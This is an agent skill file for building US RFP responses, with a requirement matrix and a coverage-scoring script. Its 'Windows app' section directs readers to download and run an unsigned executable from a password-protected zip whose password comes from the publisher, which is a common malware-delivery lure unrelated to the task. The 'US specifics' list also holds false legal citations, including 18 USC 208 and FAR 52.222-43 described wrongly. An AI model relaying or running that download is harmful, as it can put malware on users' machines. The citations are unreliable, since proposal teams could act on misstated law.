---
name: rfp-response-builder
description: Builds a US RFP response from a requirement matrix, scores coverage of every requirement and flags the answers a reviewer must check. Use when the user asks for rfp response builder, rfp compliance matrix, government proposal template. For US contractors and proposal teams responding to public and private RFPs.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# RFP Response Builder

**Builds a US RFP response from a requirement matrix, scores coverage of every requirement and flags the answers a reviewer must check.** Written for US contractors and proposal teams responding to public and private RFPs.

Use this skill when someone asks for:

- rfp response builder
- rfp compliance matrix
- government proposal template
- rfp requirement tracker

---

## The job

Respondents write a narrative and forget the requirement matrix, so the bid misses a mandatory line item and loses points or gets set aside.

## What you get

1. Break the RFP into numbered requirements with the source page and the mandatory or optional flag.
2. Answer each requirement with an owner, the source document and a status.
3. Score the response for coverage and flag every answer that is still a guess.
4. Assemble the response in the order the RFP asked for, with the matrix attached.

Output contract:

- requirements - numbered requirements with the page reference and the mandatory flag
- response_matrix - answer, owner, source document and status for each requirement
- coverage - the scored table of what is answered, partial and missing
- legal_flags - answers that promise compliance without the evidence

## US specifics that matter

- The Federal Acquisition Regulation at 48 CFR governs how US federal agencies buy, and the solicitation states the rules for the specific bid.
- The FAR requires a cost or pricing data certification on many negotiated contracts, and false certification is a crime under 18 USC 1001.
- The National Procurement Fraud Act, 18 USC 208, makes it a crime to disclose procurement information to another bidder or an unauthorized person.
- FAR 52.222-43 requires the contractor's pricing to be fair and reasonable relative to the government's pricing data.
- DFARS 252.204-7012 requires covered defense information to be handled under NIST SP 800-171 controls.

## Guardrails (hard rules)

- Never claim a certification, an approval or a compliance the company does not hold.
- Never fill a requirement answer from another bidder's proposal or from confidential data.
- Never submit the response on the bidder's behalf; the authorized signer does that.
- Never guess a delivery date, a warranty term or a staffing level.

## Quickstart

### 1. Fill in the brief

`templates/rfp-requirements.csv` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/score_rfp_coverage.py --input rfp-requirements.csv --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/rfp-response-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Read the solicitation first**

- Note the due date, the time zone and whether questions to the buyer are allowed.
- Give every requirement a number from the RFP and the page it came from.
- Mark mandatory, optional and scored criteria separately.
- Check whether the buyer wants the compliance matrix inline or as an appendix.

**Federal specifics**

- FAR 15.203-2 sets what a proposal must contain, and FAR 15.204-5 is the outline for the volume.
- SAM.gov registration and the unique entity identifier have to be current before submission.
- Export-control and country-of-origin questions can disqualify a bid on paper.
- A small business set-aside has size and ownership rules that are checked first.

**Answer discipline**

- Answer with the fact and the evidence, not with a promise.
- One owner per requirement and one date to return the answer.
- Attach the matrix so an evaluator can trace every line.
- Mark an unanswered requirement as unanswered instead of softening the language.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/rfp-response-rules.md` - US RFP rules and the traps inside a compliance matrix
- `templates/rfp-requirements.csv` - the brief to fill in
- `scripts/score_rfp_coverage.py` - the working script

## Verify the bundle

```bash
python3 scripts/score_rfp_coverage.py --input rfp-requirements.csv --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
